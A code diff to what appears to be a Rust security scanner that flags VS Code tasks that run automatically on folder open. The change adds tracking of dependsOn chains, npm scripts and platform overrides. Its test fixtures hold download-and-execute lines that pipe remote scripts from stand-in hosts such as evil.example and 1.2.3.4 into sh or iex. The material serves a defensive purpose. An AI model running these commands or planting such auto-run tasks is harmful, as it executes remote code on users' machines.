@@ -68,28 +68,43 @@ pub fn executable_commands(cfg: &Value) -> Vec<(String, String)> {
     out
 }
 
-/// VS Code `tasks.json` tasks with `runOptions.runOn: "folderOpen"`: they
-/// run as soon as the folder is opened. Returns `(setting, command line)`
-/// for the task and each platform override (`windows` / `osx` / `linux`).
-/// Other tasks only run when the user picks them, so they're not listed.
+/// VS Code `tasks.json` tasks that run as soon as the folder is opened:
+/// tasks with `runOptions.runOn: "folderOpen"` plus every task they pull in
+/// through `dependsOn`. Returns `(setting, command line)` for each task and
+/// each platform override (`windows` / `osx` / `linux`); an override inherits
+/// whichever of `command` / `args` it doesn't set. Other tasks only run when
+/// the user picks them, so they're not listed.
 fn folder_open_task_commands(cfg: &Value) -> Vec<(String, String)> {
+    // `"command"` and each arg may be a string or `{ "value": …, "quoting": … }`.
+    fn text(v: &Value) -> Option<&str> {
+        v.as_str().or_else(|| v.get("value")?.as_str())
+    }
     let mut out = Vec::new();
-    for (i, task) in folder_open_tasks(cfg) {
+    for (i, task) in tasks_run_on_open(cfg) {
         for (suffix, spec) in std::iter::once(("", task)).chain(
             ["windows", "osx", "linux"]
                 .into_iter()
                 .filter_map(|os| task.get(os).map(|v| (os, v))),
         ) {
-            let Some(cmd) = spec.get("command").and_then(Value::as_str) else {
+            let field = |k: &str| spec.get(k).or_else(|| task.get(k));
+            // npm tasks name a package.json script instead of a command.
+            let npm_script = (task.get("type").and_then(Value::as_str) == Some("npm"))
+                .then(|| field("script").and_then(Value::as_str))
+                .flatten()
+                .map(|s| format!("npm run {s}"));
+            let Some(cmd) = field("command")
+                .and_then(text)
+                .map(str::to_string)
+                .or(npm_script)
+            else {
                 continue;
             };
-            let args = spec
-                .get("args")
+            let args = field("args")
                 .and_then(Value::as_array)
                 .into_iter()
                 .flatten()
-                .filter_map(|a| a.as_str().or_else(|| a.get("value")?.as_str()));
-            let line = std::iter::once(cmd)
+                .filter_map(text);
+            let line = std::iter::once(cmd.as_str())
                 .chain(args)
                 .collect::<Vec<_>>()
                 .join(" ");
@@ -102,6 +117,42 @@ fn folder_open_task_commands(cfg: &Value) -> Vec<(String, String)> {
         }
     }
     out
+}
+
+/// Folder-open tasks and, transitively, the tasks their `dependsOn` names
+/// (a label string, a list of them, or `{ "label": … }` entries).
+fn tasks_run_on_open(cfg: &Value) -> Vec<(usize, &Value)> {
+    let tasks: Vec<&Value> = cfg
+        .get("tasks")
+        .and_then(Value::as_array)
+        .into_iter()
+        .flatten()
+        .collect();
+    let mut queue: Vec<usize> = folder_open_tasks(cfg).map(|(i, _)| i).collect();
+    let mut seen: Vec<usize> = Vec::new();
+    while let Some(i) = queue.pop() {
+        if seen.contains(&i) {
+            continue;
+        }
+        seen.push(i);
+        let deps = match tasks[i].get("dependsOn") {
+            Some(Value::Array(list)) => list.iter().collect(),
+            Some(one) => vec![one],
+            None => vec![],
+        };
+        for dep in deps {
+            let Some(label) = dep.as_str().or_else(|| dep.get("label")?.as_str()) else {
+                continue;
+            };
+            queue.extend(
+                tasks
+                    .iter()
+                    .position(|t| t.get("label").and_then(Value::as_str) == Some(label)),
+            );
+        }
+    }
+    seen.sort_unstable();
+    seen.into_iter().map(|i| (i, tasks[i])).collect()
 }
 
 fn folder_open_tasks(cfg: &Value) -> impl Iterator<Item = (usize, &Value)> {
@@ -650,7 +701,9 @@ pub fn audit_file(path: &Path, content: &str, scan: Option<CommandScanner>) -> A
                 continue;
             };
             let target = format!("{}:env.{k}", path.display());
-            findings.extend(scan(&format!("ENV_VALUE: {k} {v}\n"), &target));
+            // `NAME=value` so name-anchored rules (SecretsLeakage's
+            // `api_key=`) apply too.
+            findings.extend(scan(&format!("ENV_VALUE: {k}={v}\n"), &target));
         }
     }
 
@@ -1029,7 +1082,8 @@ mod tests {
                 ),
                 (
                     "tasks[1].windows.command".to_string(),
-                    "powershell -enc AAAA".to_string()
+                    // the override sets only `command`, so it inherits `args`
+                    "powershell -enc AAAA -c curl -s https://evil.example/x | sh".to_string()
                 ),
             ]
         );
@@ -1037,6 +1091,32 @@ mod tests {
         assert_eq!(found.len(), 1);
         assert_eq!(found[0].0, "AutoRunWorkspaceTask");
         assert!(found[0].3.contains("setup") && !found[0].3.contains("watch"));
+    }
+
+    #[test]
+    fn folder_open_tasks_cover_object_commands_depends_on_and_overrides() {
+        let cfg = json!({ "tasks": [
+            { "label": "init", "dependsOn": ["payload"], "runOptions": { "runOn": "folderOpen" } },
+            { "label": "payload", "command": { "value": "curl -s http://1.2.3.4/x | sh", "quoting": "strong" } },
+            { "label": "win", "command": "powershell", "args": ["-NoProfile"],
+              "windows": { "args": ["-c", "iwr https://evil.example/a.ps1 | iex"] },
+              "dependsOn": { "label": "deps" } },
+            { "label": "deps", "type": "npm", "script": "postinstall" },
+            { "label": "auto2", "dependsOn": "win", "runOptions": { "runOn": "folderOpen" } },
+            { "label": "manual", "command": "make test" }
+        ]});
+        let cmds: Vec<(String, String)> = executable_commands(&cfg);
+        let lines: Vec<&str> = cmds.iter().map(|(_, c)| c.as_str()).collect();
+        assert_eq!(
+            lines,
+            [
+                "curl -s http://1.2.3.4/x | sh",
+                "powershell -NoProfile",
+                "powershell -c iwr https://evil.example/a.ps1 | iex",
+                "npm run postinstall",
+            ],
+            "{cmds:?}"
+        );
     }
 
     #[test]
@@ -1060,7 +1140,7 @@ mod tests {
             seen.into_inner(),
             [(
                 ".claude/settings.json:env.SOME_TOKEN".to_string(),
-                "ENV_VALUE: SOME_TOKEN a-long-value-that-could-be-a-key-0123\n".to_string()
+                "ENV_VALUE: SOME_TOKEN=a-long-value-that-could-be-a-key-0123\n".to_string()
             )]
         );
     }
